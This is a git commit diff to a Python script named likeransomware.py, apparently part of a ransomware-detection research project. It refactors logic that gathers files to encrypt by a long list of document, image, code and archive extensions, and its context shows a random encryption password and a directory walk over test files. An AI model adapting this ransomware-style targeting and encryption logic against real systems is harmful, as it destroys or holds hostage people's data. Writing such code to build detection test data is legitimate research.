7866931db1021ab34df364bb97cb6aed7230ece5
ohadvano <ohadvano@gmail.com>
2020-12-13 14:35:49 +0200

    .

--- likeransomware.py
+++ likeransomware.py
@@ -10,7 +10,6 @@ from os import walk
 
 def encrypt_all_files():
     password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32)) 
-    ext = ('.jpg', '.png', '.bmp', '.raw', '.c', '.java', '.class', '.cpp', '.h', '.jar', '.txt', '.doc', '.docx', '.pdf', '.ptx', '.ppt', '.rar', '.zip', '.7z', '.mp3', '.mp4', '.mpg', '.mpeg', '.avi', '.tar.gz', '.sql', '.xml', '.py', '.js', '.php', '.pps', '.cs', '.xls', '.xlsx', '.3gp', '.mov', '.mkv', '.vob', '.wps', '.odt')
     for root, dirs, files in os.walk("/TestFiles", topdown=True):  # iterate from home
         for filename in files:
             if filename.endswith(ext) and not filename.startswith(encrypted_symbol):  
@@ -26,24 +25,22 @@ def encrypt_all_files():
         break
 
 def GetAllFiles(dirName):
-    # create a list of file and sub directories 
-    # names in the given directory 
+    ext = ('.jpg', '.png', '.bmp', '.raw', '.c', '.java', '.class', '.cpp', '.h', '.jar', '.txt', '.doc', '.docx', '.pdf', '.ptx', '.ppt', '.rar', '.zip', '.7z', '.mp3', '.mp4', '.mpg', '.mpeg', '.avi', '.tar.gz', '.sql', '.xml', '.py', '.js', '.php', '.pps', '.cs', '.xls', '.xlsx', '.3gp', '.mov', '.mkv', '.vob', '.wps', '.odt')
     listOfFile = os.listdir(dirName)
     allFiles = list()
-    # Iterate over all the entries
     for entry in listOfFile:
-        # Create full path
         fullPath = os.path.join(dirName, entry)
-        # If entry is a directory then get the list of files in this directory 
         if os.path.isdir(fullPath):
             allFiles = allFiles + GetAllFiles(fullPath)
         else:
-            allFiles.append(fullPath)
-                
+            if fullPath.endswith(ext):
+                allFiles.append(fullPath)
     return allFiles
 
 ###################### main ######################
 
-basePath = "/home/ohadoz/Desktop/RansomwareDetection/TestData/output/TestFiles"
-files_list = GetAllFiles(basePath)
-print(files_list)
+base_path = "/home/ohadoz/Desktop/RansomwareDetection/TestData/output/TestFiles"
+files_to_encrypt = GetAllFiles(base_path)
+for file in files_to_encrypt:
+    print(file)
+    print("\n")
